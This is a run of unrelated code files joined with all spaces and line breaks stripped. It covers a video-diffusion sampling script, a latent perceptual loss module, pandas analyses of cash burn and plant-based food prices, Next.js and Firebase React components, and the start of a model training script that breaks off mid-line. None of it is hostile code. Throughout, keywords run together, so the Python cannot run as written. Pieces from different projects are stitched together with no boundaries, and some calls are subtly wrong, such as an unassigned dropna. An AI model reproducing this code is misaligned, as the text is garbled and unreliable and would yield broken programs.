")imageio.mimwrite(video_path,vid)defget_unique_embedder_keys_from_conditioner(conditioner):returnlist(set([x.input_keyforxinconditioner.embedders]))defget_batch(keys,value_dict,N,T,device):batch={}batch_uc={}forkeyinkeys:ifkey=="fps_id":batch[key]=(torch.tensor([value_dict["fps_id"]]).to(device).repeat(int(math.prod(N))))elifkey=="motion_bucket_id":batch[key]=(torch.tensor([value_dict["motion_bucket_id"]]).to(device).repeat(int(math.prod(N))))elifkey=="cond_aug":batch[key]=repeat(torch.tensor([value_dict["cond_aug"]]).to(device),"1->b",b=math.prod(N),)elifkey=="cond_frames"orkey=="cond_frames_without_noise":batch[key]=repeat(value_dict[key],"1...->b...",b=N[0])elifkey=="polars_rad"orkey=="azimuths_rad":batch[key]=torch.tensor(value_dict[key]).to(device).repeat(N[0])else:batch[key]=value_dict[key]ifTisnotNone:batch["num_video_frames"]=Tforkeyinbatch.keys():ifkeynotinbatch_ucandisinstance(batch[key],torch.Tensor):batch_uc[key]=torch.clone(batch[key])returnbatch,batch_ucdefload_model(config:str,device:str,num_frames:int,num_steps:int,verbose:bool=False,):config=OmegaConf.load(config)ifdevice=="cuda":config.model.params.conditioner_config.params.emb_models[0].params.open_clip_embedding_config.params.init_device=deviceconfig.model.params.sampler_config.params.verbose=verboseconfig.model.params.sampler_config.params.num_steps=num_stepsconfig.model.params.sampler_config.params.guider_config.params.num_frames=(num_frames)ifdevice=="cuda":withtorch.device(device):model=instantiate_from_config(config.model).to(device).eval()else:model=instantiate_from_config(config.model).to(device).eval()filter=DeepFloydDataFiltering(verbose=False,device=device)returnmodel,filterif__name__=="__main__":Fire(sample)importtorchimporttorch.nnasnnfrom....utilimportdefault,instantiate_from_configfrom..lpips.loss.lpipsimportLPIPSclassLatentLPIPS(nn.Module):def__init__(self,decoder_config,perceptual_weight=1.0,latent_weight=1.0,scale_input_to_tgt_size=False,scale_tgt_to_input_size=False,perceptual_weight_on_inputs=0.0,):super().__init__()self.scale_input_to_tgt_size=scale_input_to_tgt_sizeself.scale_tgt_to_input_size=scale_tgt_to_input_sizeself.init_decoder(decoder_config)self.perceptual_loss=LPIPS().eval()self.perceptual_weight=perceptual_weightself.latent_weight=latent_weightself.perceptual_weight_on_inputs=perceptual_weight_on_inputsdefinit_decoder(self,config):self.decoder=instantiate_from_config(config)ifhasattr(self.decoder,"encoder"):delself.decoder.encoderdefforward(self,latent_inputs,latent_predictions,image_inputs,split="train"):log=dict()loss=(latent_inputs-latent_predictions)**2log[f"{split}/latent_l2_loss"]=loss.mean().detach()image_reconstructions=Noneifself.perceptual_weight>0.0:image_reconstructions=self.decoder.decode(latent_predictions)image_targets=self.decoder.decode(latent_inputs)perceptual_loss=self.perceptual_loss(image_targets.contiguous(),image_reconstructions.contiguous())loss=(self.latent_weight*loss.mean()+self.perceptual_weight*perceptual_loss.mean())log[f"{split}/perceptual_loss"]=perceptual_loss.mean().detach()ifself.perceptual_weight_on_inputs>0.0:image_reconstructions=default(image_reconstructions,self.decoder.decode(latent_predictions))ifself.scale_input_to_tgt_size:image_inputs=torch.nn.functional.interpolate(image_inputs,image_reconstructions.shape[2:],mode="bicubic",antialias=True,)elifself.scale_tgt_to_input_size:image_reconstructions=torch.nn.functional.interpolate(image_reconstructions,image_inputs.shape[2:],mode="bicubic",antialias=True,)perceptual_loss2=self.perceptual_loss(image_inputs.contiguous(),image_reconstructions.contiguous())loss=loss+self.perceptual_weight_on_inputs*perceptual_loss2.mean()log[f"{split}/perceptual_loss_on_inputs"]=perceptual_loss2.mean().detach()returnloss,log#AveragewordlengthofessaysdefaverageWordLength(essay):returnsum([len(i)foriinessay])/len(essay)#Totalnumberofsentencesdefsentcount(essay):fromnltkimporttokenizereturnlen(tokenize.sent_tokenize(essay))importosfromtypingimportListimporttorchfromomegaconfimportOmegaConfimportnumpyasnpfromsdataimportcreate_dataset,create_loadernum_it=100max_vis=3if__name__=="__main__":filedir=os.path.realpath(os.path.dirname(__file__))config_path=os.path.join(filedir,"configs","example.yaml")config=OmegaConf.load(config_path)#buildconfigdatapipeline=create_dataset(**config.dataset)#buildloaderloader=create_loader(datapipeline,**config.loader)print(f"Yielding{num_it}batches")fori,batchinenumerate(loader):ifi>=num_it:breakforkeyinbatch:ifisinstance(batch[key],(torch.Tensor,np.ndarray)):print(key,batch[key].shape)elifisinstance(batch[key],(List)):print(key)print(batch[key][:max_vis])print("ciao")importpandasaspd#Createadataframefromtheprovideddatadata={"Quarter":["Q22011","Q32011","Q12012","Q22012","Q32012","Q12013","Q22013","Q32013","Q12014","Q12015","Q12016","Q12017","Q22017","Q32017","Q12018","Q22018","Q32018","Q12019","Q22019","Q32019","Q12020","Q22020","Q32020","Q12021","Q22021","Q32021","Q12022","Q22022","Q32022","Q12023","Q22023","Q32023","Q12024","Q22024"],"Cash&Equivalents":[62.8,71.7,73.8,79.0,88.2,51.6,51.5,49.7,45.9,37.2,26.6,17.3,14.1,11.9,10.7,9.6,20.4,19.1,18.5,17.8,25.6,25.3,24.1,282.2,278.3,241.5,209.7,197.2,174.7,187.5,168.4,142.4,124.2,207.3]}df=pd.DataFrame(data)#Convert'Quarter'todatetimedf['Date']=pd.to_datetime(df['Quarter'].str.replace('Q','').apply(lambdax:f"{int(x.split()[1])}-{'03-31'ifx.split()[0]=='1'else'06-30'ifx.split()[0]=='2'else'09-30'ifx.split()[0]=='3'else'12-31'}"))#Sortthedataframebydatedf=df.sort_values('Date').reset_index(drop=True)#Calculatethetimedifferenceinmonthsbetweenquartersdf['MonthsBetween']=df['Date'].diff(-1).dt.total_seconds().abs()/(30*24*3600)#Calculatethedifferencesincashbetweenquarters(cashburn)df['CashBurn']=df['Cash&Equivalents'].diff(-1)#Calculatemonthlycashburndf['MonthlyCashBurn']=df['CashBurn']/df['MonthsBetween']#Calculatecashrunway(inmonths)df['CashRunway(Months)']=df['Cash&Equivalents']/df['MonthlyCashBurn']#Displaytheresultsimportace_tools_openastoolstools.display_dataframe_to_user(name="CashBurnandRunwayAnalysis",dataframe=df)importImagefrom'next/image';import{useRouter}from'next/router';import{productMap}from'@/data/products';importImageSliderfrom'@/components/ImageSlider';import{useState,useEffect}from'react';importHeadfrom'next/head';importNavbarfrom'@/components/Navbar';importFooterfrom'@/components/Footer';importLinkfrom'next/link';constProductDetailPage=()=>{constrouter=useRouter();const{productId}=router.query;constproduct=productMap[productId];if(!product){return<div></div>;}else{return(<div><Head><title>{product['name']}</title><linkrel='icon'href='/favicon.png'/></Head><Navbar/><divclassName='xl:w-3/5lg:w-4/5md:w-4/5sm:w-screenmx-autoh-screen'><divclassName='flexxl:flex-rowflex-colp-4py-20'><div><ImageSliderpaths={product['images']}/></div><divclassName='ml-10'><h1className='text-4xlfont-semiboldmb-6'>{product['name']}</h1><tableclassName='w-80text-leftborder-0mb-3'><tr><tdclassName='font-semibold'>InkColor</td><td>{product['inkColor']}</td></tr><tr><tdclassName='font-semibold'>NumberofItems</td><td>{product['count']}</td></tr><tr><tdclassName='font-semibold'>PointType</td><td>{product['pointType']}</td></tr></table><pclassName='mb-4'>{product['description']}</p><divclassName='mt-6'><Linkhref='/order'className='rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-2.5text-smfont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600'>BulkOrder</Link></div><hrclassName='h-pxmy-8bg-gray-200border-0dark:bg-gray-700'/><pclassName='font-boldmb-2text-xl'>Aboutthisitem</p><pclassName='mb-1'><bclassName='font-semibold'>NON-FADING</b>:Freeliquidinktechnologyprovidesconstantsmoothinkshadeuntilthelastdrop.Ourmarkersdonotfadeasinkisused.</p><pclassName='mb-1'><bclassName='font-semibold'>VISIBLEINKGAUGE</b>:Weincorporateatransparentbarrelwithaprintedgaugesoyoualwaysknowhowmuchinkisleftinyourpermanentmarker.</p><pclassName='mb-1'><bclassName='font-semibold'>1.5XINKCAPACITY</b>:LiqeoPropermanentmarkerscanwriteupto1.5Xoftraditionalpermanentmarkerswhichmeansyougetmorewritingforyourmoney.</p><pclassName='mb-1'><bclassName='font-semibold'>QUICKDRYING&LOWODORINK</b>:Liqeoinkdriesquicklyandispermanentonmostporousandnon-poroussurfacesincludingpaper,metal,plastic,&cardboard.Ourinkisalsolowodoranddoesnotemitunpleasantsmellslikeothermarkers.</p></div></div></div><Footer/></div>);}};exportdefaultProductDetailPage;'useclient';importSidebarItemfrom'./SidebarItem';importHorizontalLineNarrowfrom'../utils/HorizontalLine';import{onAuthStateChanged,signOut}from'firebase/auth';import{auth,db}from'@/firebase/firebase';import{useEffect,useState}from'react';import{doc,onSnapshot}from'firebase/firestore';constSidebar=({activeIndex})=>{const[classes,setClasses]=useState([]);useEffect(()=>{constsavedClasses=localStorage.getItem('userClasses');if(savedClasses){setClasses(JSON.parse(savedClasses));}else{constunsubscribeAuth=onAuthStateChanged(auth,(user)=>{if(user){constdocRef=doc(db,'users',user.uid);constunsub=onSnapshot(docRef,(doc)=>{if(doc.exists()){constuserData=doc.data();constuserClasses=userData['classes'];setClasses(userClasses);localStorage.setItem('userClasses',JSON.stringify(userClasses));}else{console.log('Nosuchdocument!');}});//UnsubscribefromtheFirestorelistenerwhenunmountingreturn()=>unsub();}});//Unsubscribefromtheauthstatelistenerwhenunmountingreturn()=>unsubscribeAuth();}},[]);//ConstantsidebaritemsconstconstantItems=[{title:'Home',href:'/'},{title:'Search',href:'/search'},{title:'Inbox',href:'/inbox'},];//DynamicclasssidebaritemsconstclassItems=classes.map((c)=>({title:c,href:`/class/${c.replace(/\s/g,'')}`}));consthandleSignOut=()=>{signOut(auth);window.location.href='/';};return(<asideclassName='w-64border-rborder-gray-200p-4stickytop-0h-screenoverflow-y-automin-w-40'><ul>{/*Renderconstantitems*/}{constantItems.map((item,i)=>(<SidebarItemkey={i}title={item.title}href={item.href}active={i===activeIndex}/>))}</ul>{/*Horizontallinebetweenconstantitemsandclassitems*/}<HorizontalLineNarrow/><ul>{/*Renderdynamicclassitems*/}{classItems.map((item,i)=>(<SidebarItemkey={i}title={item.title}href={item.href}active={i+constantItems.length===activeIndex}/>))}</ul><HorizontalLineNarrow/><buttononClick={handleSignOut}className='flexfont-mediumitems-centergap-2p-2rounded-lgtext-red-500hover:bg-red-50transition-colorsduration-200ease-outw-full'>LogOut</button></aside>);};exportdefaultSidebar;importpandasaspdimportmatplotlib.pyplotaspltimportstatsmodels.apiassmimportwarningswarnings.filterwarnings('ignore')df=pd.read_csv('data.csv')#columns=['Retailer','Location','Brand','Distributor','DistributorCity','DistributorState','DistributorZipCode','Product','Organic','NoSoy','NoAddedSugar','NoAntibiotics','NoArtificialIngredients','Vegan','Vegetarian','PlantBased','Non-GMO','GlutenFree','SoldOut','Date','DayofWeek','OriginalPrice($)','DiscountedPrice($)','NetWeight(g)','#ofServings','#ofPiecesperServing','PricebyWeight($/g)','PricebyServing($)','FrontPhoto','BackPhoto','ServingSize(g)','Calories(Cal)','TotalFat(g)','SaturatedFat(g)','TransFat(g)','PolyunsaturatedFat(g)','MonounsaturatedFat','Cholesterol(mg)','Sodium(mg)','TotalCarbohydrate(g)','DietaryFiber(g)','TotalSugars(g)','AddedSugars(g)','Protein(g)','VitaminD(mcg)','Calcium(mg)','Iron(mg)','Potassium(mg)','Ingredients']df.dropna()df['PricebyWeight($/g)']=df['PricebyWeight($/g)'].astype(float)df['OriginalPrice($)']=df['OriginalPrice($)'].astype(float)df['DiscountedPrice($)']=df['DiscountedPrice($)'].astype(float)df['Discount']=1-(df['DiscountedPrice($)']/df['OriginalPrice($)'])df['Checks']=df[['Organic','NoSoy','NoAddedSugar','NoAntibiotics','NoArtificialIngredients','Vegan','Vegetarian','PlantBased','Non-GMO','GlutenFree']].sum(axis=1)nutrients=['Calories(Cal)','TotalFat(g)','SaturatedFat(g)','Cholesterol(mg)','Sodium(mg)','TotalCarbohydrate(g)','DietaryFiber(g)','TotalSugars(g)','Protein(g)','VitaminD(mcg)','Calcium(mg)','Iron(mg)','Potassium(mg)']defformat_graph(ax:plt.Axes,title:str):ax.set_title(title)ax.xaxis.label.set_size(14)ax.yaxis.label.set_size(14)ax.title.set_size(16)#numberofproductsperretailerretailer_item_count=df.groupby('Retailer')['Product'].count().reset_index()retailer_item_count.to_clipboard()print(retailer_item_count)#retailerpricingretailer_price=df.groupby('Retailer')['PricebyWeight($/g)'].mean().reset_index()retailer_price.sort_values(by='PricebyWeight($/g)',inplace=True)fig,ax=plt.subplots(figsize=(12,6))ax.bar(retailer_price['Retailer'],retailer_price['PricebyWeight($/g)'])ax.set_xlabel('Retailer')ax.set_ylabel('PricebyWeight($/g)')ax.set_title('RetailerPricing')ax.xaxis.label.set_size(14)ax.yaxis.label.set_size(14)ax.title.set_size(16)fig.savefig('figures/retailer_price.png')#retailerdiscountretailer_discount_df=df.groupby('Retailer')['Discount'].mean().reset_index()print(retailer_discount_df)#coverdesignminimalistic=[('GrainTrust','SteamedJasmineRice'),('Jack&Annie\'s','BuffaloJackWings'),('Laoban','Livin\'ontheVedgeDumplings'),('WholeFoodsMarket','VegetablePotStickers'),('Just','JustEgg')]cluttered=[('Pulmuone','Plant-BasedBulgogiStyleFriedRice'),('Gardein','UltimatePlant-BasedChick\'nFilets'),('Hilary\'s','VeggieBurgers'),('Dr.Praeger\'s','AllAmericanDrive-ThruBurger'),('Day-LeePride','UmamiGyozaDumplings'),]minimalistic_df=df[df.apply(lambdax:(x['Brand'],x['Product'])inminimalistic,axis=1)]cluttered_df=df[df.apply(lambdax:(x['Brand'],x['Product'])incluttered,axis=1)]cover_design_comparison_df=pd.DataFrame(columns=['Category','Minimalistic','Cluttered'])minimalistic_price_by_weight=minimalistic_df['PricebyWeight($/g)'].mean()cluttered_price_by_weight=cluttered_df['PricebyWeight($/g)'].mean()cover_design_comparison_df=cover_design_comparison_df.append({'Category':'PricebyWeight($/g)','Minimalistic':minimalistic_price_by_weight,'Cluttered':cluttered_price_by_weight},ignore_index=True)minimalistic_average_discount=minimalistic_df['Discount'].mean()cluttered_average_discount=cluttered_df['Discount'].mean()cover_design_comparison_df=cover_design_comparison_df.append({'Category':'AverageDiscount','Minimalistic':minimalistic_average_discount,'Cluttered':cluttered_average_discount},ignore_index=True)minimalistic_average_net_weight=minimalistic_df['NetWeight(g)'].mean()cluttered_average_net_weight=cluttered_df['NetWeight(g)'].mean()cover_design_comparison_df=cover_design_comparison_df.append({'Category':'AverageNetWeight(g)','Minimalistic':minimalistic_average_net_weight,'Cluttered':cluttered_average_net_weight},ignore_index=True)print(cover_design_comparison_df)#netweightvspricebyweightscatterplotfig,ax=plt.subplots(figsize=(12,6))ax.scatter(df['NetWeight(g)'],df['PricebyWeight($/g)'])ax.set_xlabel('NetWeight(g)')ax.set_ylabel('PricebyWeight($/g)')format_graph(ax,'NetWeightvsPricebyWeight')fig.savefig('figures/net_weight_vs_price_by_weight.png')#netweightdistributionhistogramfig,ax=plt.subplots(figsize=(12,6))ax.hist(df['NetWeight(g)'],bins=20)ax.set_xlabel('NetWeight(g)')ax.set_ylabel('Frequency')median=df['NetWeight(g)'].median()ax.axvline(median,color='red',linestyle='dashed',linewidth=1)ax.text(median+10,15,f'Median:{median:.2f}',color='red',fontsize=14)format_graph(ax,'NetWeightDistribution')fig.savefig('figures/net_weight_distribution.png')#pricebyweightdistributionhistogramfig,ax=plt.subplots(figsize=(12,6))ax.hist(df['PricebyWeight($/g)'],bins=20)ax.set_xlabel('PricebyWeight($/g)')ax.set_ylabel('Frequency')median=df['PricebyWeight($/g)'].median()ax.axvline(median,color='red',linestyle='dashed',linewidth=1)ax.text(median+0.0005,8.5,f'Median:{median:.2f}',color='red',fontsize=14)format_graph(ax,'PricebyWeightDistribution')fig.savefig('figures/price_by_weight_distribution.png')#originalpricedistributionfig,ax=plt.subplots(figsize=(12,6))ax.hist(df['OriginalPrice($)'],bins=20)ax.set_xlabel('OriginalPrice')ax.set_ylabel('Frequency')median=df['OriginalPrice($)'].median()ax.axvline(median,color='red',linestyle='dashed',linewidth=1)ax.text(median+0.5,15,f'Median:{median:.2f}',color='red',fontsize=14)format_graph(ax,'OriginalPriceDistribution')fig.savefig('figures/original_price_distribution.png')#discountedpricedistributionfig,ax=plt.subplots(figsize=(12,6))ax.hist(df['DiscountedPrice($)'],bins=20)ax.set_xlabel('DiscountedPrice')ax.set_ylabel('Frequency')median=df['DiscountedPrice($)'].median()ax.axvline(median,color='red',linestyle='dashed',linewidth=1)ax.text(median+0.5,15,f'Median:{median:.2f}',color='red',fontsize=14)format_graph(ax,'DiscountedPriceDistribution')fig.savefig('figures/discounted_price_distribution.png')#discountdistributionfig,ax=plt.subplots(figsize=(12,6))ax.hist(df['Discount'],bins=20)ax.set_xlabel('Discount')ax.set_ylabel('Frequency')median=df['Discount'].median()ax.axvline(median,color='red',linestyle='dashed',linewidth=1)ax.text(median+0.5,15,f'Median:{median:.2f}',color='red',fontsize=14)format_graph(ax,'DiscountDistribution')fig.savefig('figures/discount_distribution.png')#highestandlowestpricebyweightdf.sort_values(by='PricebyWeight($/g)',inplace=True)print(df[['Brand','Product','PricebyWeight($/g)']].head(1))print(df[['Brand','Product','PricebyWeight($/g)']].tail(1))#twohorizontalboxplotsofpricebyweightforveganandnon-veganproductsvegan_df=df[df['Vegan']==True]non_vegan_df=df[df['Vegan']==False]fig,ax=plt.subplots(figsize=(12,6))ax.boxplot([vegan_df['PricebyWeight($/g)'],non_vegan_df['PricebyWeight($/g)']],vert=False)ax.set_yticklabels(['Vegan','Non-Vegan'])ax.set_xlabel('PricebyWeight($/g)')format_graph(ax,'PricebyWeightforVeganandNon-VeganProducts')fig.savefig('figures/price_by_weight_for_vegan_and_non_vegan_products.png')#linearregresseiontoseewhichfeaturecontributesmosttopricebyweightx=df[['Organic','NoSoy','NoAddedSugar','NoAntibiotics','NoArtificialIngredients','Vegan','Vegetarian','PlantBased','Non-GMO','GlutenFree']].astype(int)y=df['PricebyWeight($/g)']model=sm.OLS(y,sm.add_constant(x))results=model.fit()print(results.summary())#nutrientcomparisonbetweenveganandnon-veganproductsnutrient_vegan_comparison_df=pd.DataFrame(columns=['Category','Vegan','Non-Vegan'])forcategoryinnutrients:vegan_average=vegan_df[category].mean()non_vegan_average=non_vegan_df[category].mean()nutrient_vegan_comparison_df=nutrient_vegan_comparison_df.append({'Category':category,'Vegan':vegan_average,'Non-Vegan':non_vegan_average},ignore_index=True)print(nutrient_vegan_comparison_df)#nutrientcomparisonbetweenplant-basedandnon-plant-basedproductsnutrient_plant_based_comparison_df=pd.DataFrame(columns=['Category','PlantBased','Non-PlantBased'])plant_based_df=df[df['PlantBased']==True]non_plant_based_df=df[df['PlantBased']==False]forcategoryinnutrients:plant_based_average=plant_based_df[category].mean()non_plant_based_average=non_plant_based_df[category].mean()nutrient_plant_based_comparison_df=nutrient_plant_based_comparison_df.append({'Category':category,'PlantBased':plant_based_average,'Non-PlantBased':non_plant_based_average},ignore_index=True)print(nutrient_plant_based_comparison_df)nutrient_plant_based_comparison_df.to_clipboard()#averagepricebyweightforeachbrandbrand_price_by_weight_df=df.groupby('Brand')['PricebyWeight($/g)'].mean().reset_index()brand_price_by_weight_df.sort_values(by='PricebyWeight($/g)',inplace=True,ascending=False)print(brand_price_by_weight_df)importpandasaspdimportosforfileinos.listdir('src/Data/Raw'):pd.read_csv('src/Data/Raw/'+file).to_feather('src/Data/Optimized/'+file[:-4]+'.feather')importargparseimportdatetimeimportglobimportinspectimportosimportsysfrominspectimportParameterfromtypingimportUnionimportnumpyasnpimportpytorch_lightningasplimporttorchimporttorchvisionimportwandbfrommatplotlibimportpyplotaspltfromnatsortimportnatsortedfromomegaconfimportOmegaConffrompackagingimportversionfromPILimportImagefrompytorch_lightningimportseed_everythingfrompytorch_lightning.callbacksimportCallbackfrompytorch_lightning.loggersimportWandbLoggerfrompytorch_lightning.trainerimportTrainerfrompytorch_lightning.utilitiesimportrank_zero_onlyfromsgm.utilimportexists,instantiate_from_config,isheatmapMULTINODE_HACKS=Truedefdefault_trainer_args():argspec=dict(inspect.signature(Trainer.__init__).parameters)argspec.pop("self")default_args={param:argspec[param].defaultforparaminargspecifargspec[param]!=Parameter.empty}returndefault_argsdefget_parser(**parser_kwargs):defstr2bool(v):ifisinstance(v,bool):returnvifv.lower()in("yes","true","t","y","1"):returnTrueelifv.lower()in("no","false","f","n","0"):returnFalseelse:raiseargparse.ArgumentTypeError("Booleanvalueexpected.")parser=argparse.ArgumentParser(**parser_kwargs)parser.add_argument("-n","--name",type=str,const=True,default="",nargs="?",help="postfixforlogdir",)parser.add_argument("--no_date",type=str2bool,nargs="?",const=True,default=False,help="ifTrue,skipdategenerationforlogdirandonlyusenamingviaopt.baseoropt.name(+opt.postfix,optionally)",)parser.add_argument("-r","--resume",type=str,const=True,default="",nargs="?",help="resumefromlogdirorcheckpointinlogdir",)parser.add_argument("-b","--base",nargs="*",metavar="base_config.yaml",help="pathstobaseconfigs.Loadedfromleft-to-right.""Parameterscanbeoverwrittenoraddedwithcommand-lineoptionsoftheform`--keyvalue`.",default=list(),)parser.add_argument("-t","--train",type=str2bool,const=True,default=True,nargs="?",help="train",)parser.add_argument("--no-test",type=str2bool,const=True,default=False,nargs="?",help="disabletest",)parser.add_argument("-p","--project",help="nameofneworpathtoexistingproject")parser.add_argument("-d","--debug",type=str2bool,nargs="?",const=True,default=False,help="enablepost-mortemdebugging",)parser.add_argument("-s","--seed",type=int,default=23,help="seedforseed_everything",)parser.add_argument("-f","--postfix",type=str,default="",help="post-postfixfordefaultname",)parser.add_argument("--projectname",type=str,default="stablediffusion",)parser.add_argument("-l","--logdir",type=str,default="logs",help="directoryforloggingdatshit",)parser.add_argument("--scale_lr",type=str2bool,nargs="?",const=True,default=False,help="scalebase-lrbyngpu*batch_size*n_accumulate",)parser.add_argument("--legacy_naming",type=str2bool,nargs="?",const=True,default=False,help="namerunbasedonconfigfilenameiftrue,elsebywholepath",)parser.add_argument("--enable_tf32",type=str2bool,nargs="?",const=True,default=False,help="enablestheTensorFloat32formatbothformatmulsandcuDNNforpytorch1.12",)parser.add_argument("--startup",type=str,default=None,help="Startuptimefromdistributedscript",)parser.add_argument("--wandb",type=str2bool,nargs="?",const=True,default=False,#TODO:laterdefaulttoTruehelp="logtowandb",)parser.add_argument("--no_base_name",type=str2bool,nargs="?",const=True,default=False,#TODO:laterdefaulttoTruehelp="logtowandb",)ifversion.parse(torch.__version__)>=version.parse("2.0.0"):parser.add_argument("--resume_from_checkpoint",type=str,default=None,help="singlecheckpointfiletoresumefrom",)default_args=default_trainer_args()forkeyindefault_args:parser.add_argument("--"+key,default=default_args[key])returnparserdefget_checkpoint_name(logdir):ckpt=os.path.join(logdir,"checkpoints","last**.ckpt")ckpt=natsorted(glob.glob(ckpt))print('available"last"checkpoints:')print(ckpt)iflen(ckpt)>1:print("gotmostrecentcheckpoint")ckpt=sorted(ckpt,key=lambdax:os.path.getmtime(x))[-1]print(f"Mostrecentckptis{ckpt}")withopen(os.path.join(logdir,"most_recent_ckpt.txt"),"w")asf:f.write(ckpt+"\n")try:version=int(ckpt.split("/")[-1].split("-v")[-1].split(".")[0])exceptExceptionase:print("versionconfusionbutnotbad")print(e)version=1#version=last_version+1else:#inthiscase,weonlyhaveone"last.ckpt"ckpt=ckpt[0]version=1melk_ckpt_name=f"last-v{version}.ckpt"print(f"Currentmelkckptname:{melk_ckpt_name}")returnckpt,melk_ckpt_nameclassSetupCallback(Callback):def__init__(self,resume,now,logdir,ckptdir,cfgdir,config,lightning_config,debug,ckpt_name=None,):super().__init__()self.resume=resumeself.now=nowself.logdir=logdirself.ckptdir=ckptdirself.cfgdir=cfgdirself.config=configself.lightning_config=lightning_configself.debug=debugself.ckpt_name=ckpt_namedefon_exception(self,trainer:pl.Trainer,pl_module,exception):ifnotself.debugandtrainer.global_rank==0:print("Summoningcheckpoint.")ifself.ckpt_nameisNone:ckpt_path=os.path.join(self.ckptdir,"last.ckpt")else:ckpt_path=os.path.join(self.ckptdir,self.ckpt_name)trainer.save_checkpoint(ckpt_path)defon_fit_start(self,trainer,pl_module):iftrainer.global_rank==0:#Createlogdirsandsaveconfigsos.makedirs(self.logdir,exist_ok=True)os.makedirs(self.ckptdir,exist_ok=True)os.makedirs(self.cfgdir,exist_ok=True)if"callbacks"inself.lightning_config:if("metrics_over_trainsteps_checkpoint"inself.lightning_config["callbacks"]):os.makedirs(os.path.join(self.ckptdir,"trainstep_checkpoints"),exist_ok=True,)print("Projectconfig")print(OmegaConf.to_yaml(self.config))ifMULTINODE_HACKS:importtimetime.sleep(5)OmegaConf.save(self.config,os.path.join(self.cfgdir,"{}-project.yaml".format(self.now)),)print("Lightningconfig")print(OmegaConf.to_yaml(self.lightning_config))OmegaConf.save(OmegaConf.create({"lightning":self.lightning_config}),os.path.join(self.cfgdir,"{}-lightning.yaml".format(self.now)),)else:#ModelCheckpointcallbackcreatedlogdirectory---removeitifnotMULTINODE_HACKSandnotself.resumeandos.path.exists(self.logdir):dst,name=os.path.split(self.logdir)dst=os.path.join(dst,"child_runs",name)os.makedirs(os.path.split(dst)[0],exist_ok=True)try:os.rename(self.logdir,dst)exceptFileNotFoundError:passclassImageLogger(Callback):def__init__(self,batch_frequency,max_images,clamp=True,increase_log_steps=True,rescale=True,disabled=False,log_on_batch_idx=False,log_first_step=False,log_images_kwargs=None,log_before_first_step=False,enable_autocast=True,):super().__init__()self.enable_autocast=enable_autocastself.rescale=rescaleself.batch_freq=batch_frequencyself.max_images=max_imagesself.log_steps=[2**nforninrange(int(np.log2(self.batch_freq))+1)]ifnotincrease_log_steps:self.log_steps=[self.batch_freq]self.clamp=clampself.disabled=disabledself.log_on_batch_idx=log_on_batch_idxself.log_images_kwargs=log_images_kwargsiflog_images_kwargselse{}self.log_first_step=log_first_stepself.log_before_first_step=log_before_first_step@rank_zero_onlydeflog_local(self,save_dir,split,images,global_step,current_epoch,batch_idx,pl_module:Union[None,pl.LightningModule]=None,):root=os.path.join(save_dir,"images",split)forkinimages:ifisheatmap(images[k]):fig,ax=plt.subplots()ax=ax.matshow(images[k].cpu().numpy(),cmap="hot",interpolation="lanczos")plt.colorbar(ax)plt.axis("off")filename="{}_gs-{:06}_e-{:06}_b-{:06}.png".format(k,global_step,current_epoch,batch_idx)os.makedirs(root,exist_ok=True)path=os.path.join(root,filename)plt.savefig(path)plt.close()#TODO:supportwandbelse:grid=torchvision.utils.make_grid(images[k],nrow=4)ifself.rescale:grid=(grid+1.0)/2.0#-1,1->0,1;c,h,wgrid=grid.transpose(0,1).transpose(1,2).squeeze(-1)grid=grid.numpy()grid=(grid*255).astype(np.uint8)filename="{}_gs-{:06}_e-{:06}_b-{:06}.png".format(k,global_step,current_epoch,batch_idx)path=os.path.join(root,filename)os.makedirs(os.path.split(path)[0],exist_ok=True)img=Image.fromarray(grid)img.save(path)ifexists(pl_module):assertisinstance(pl_module.logger,WandbLogger),"logger_log_imageonlysupportsWandbLoggercurrently"pl_module.logger.log_image(key=f"{split}/{k}",images=[img,],step=pl_module.global_step,)@rank_zero_onlydeflog_img(self,pl_module,batch,batch_idx,split="train"):check_idx=batch_idxifself.log_on_batch_idxelsepl_module.global_stepif(self.check_frequency(check_idx)andhasattr(pl_module,"log_images")#batch_idx%self.batch_freq==0andcallable(pl_module.log_images)and#batch_idx>5andself.max_images>0):logger=type(pl_module.logger)is_train=pl_module.trainingifis_train:pl_module.eval()gpu_autocast_kwargs={"enabled":self.enable_autocast,#torch.is_autocast_enabled(),"dtype":torch.get_autocast_gpu_dtype(),"cache_enabled":torch.is_autocast_cache_enabled(),}withtorch.no_grad(),torch.cuda.amp.autocast(**gpu_autocast_kwargs):images=pl_module.log_images(batch,split=split,**self.log_images_kwargs)forkinimages:N=min(images[k].shape[0],self.max_images)ifnotisheatmap(images[k]):images[k]=images[k][:N]ifisinstance(images[k],torch.Tensor):images[k]=images[k].detach().float().cpu()ifself.clampandnotisheatmap(images[k]):images[k]=torch.clamp(images[k],-1.0,1.0)self.log_local(pl_module.logger.save_dir,split,images,pl_module.global_step,pl_module.current_epoch,batch_idx,pl_module=pl_moduleifisinstance(pl_module.logger,WandbLogger)elseNone,)ifis_train:pl_module.train()defcheck_frequency(self,check_idx):if((check_idx%self.batch_freq)==0or(check_idxinself.log_steps))and(check_idx>0orself.log_first_step):try:self.log_steps.pop(0)exceptIndexErrorase:print(e)passreturnTruereturnFalse@rank_zero_onlydefon_train_batch_end(self,trainer,pl_module,outputs,batch,batch_idx):ifnotself.disabledand(pl_module.global_step>0orself.log_first_step):self.log_img(pl_module,batch,batch_idx,split="train")@rank_zero_onlydefon_train_batch_start(self,trainer,pl_module,batch,batch_idx):ifself.log_before_first_stepandpl_module.global_step==0:print(f"{self.__class__.__name__}:loggingbeforetraining")self.log_img(pl_module,batch,batch_idx,split="train")@rank_zero_onlydefon_validation_batch_end(self,trainer,pl_module,outputs,batch,batch_idx,*args,**kwargs):ifnotself.disabledandpl_module.global_step>0:self.log_img(pl_module,batch,batch_idx,split="val")ifhasattr(pl_module,"calibrate_grad_norm"):if(pl_module.calibrate_grad_normandbatch_idx%25==0)andbatch_idx>0:self.log_gradients(trainer,pl_module,batch_idx=batch_idx)@rank_zero_onlydefinit_wandb(save_dir,opt,config,group_name,name_str):print(f"settingWANDB_DIRto{save_dir}")os.makedirs(save_dir,exist_ok=True)os.environ["WANDB_DIR"]=save_dirifopt.debug:wandb.init(project=opt.projectname,mode="offline",group=group_name)else:wandb.init(project=opt.projectname,config=config,settings=wandb.Settings(code_dir="./sgm"),group=group_name,name=name_str,)if__name__=="__main__":#customparsertospecifyconfigfiles,tr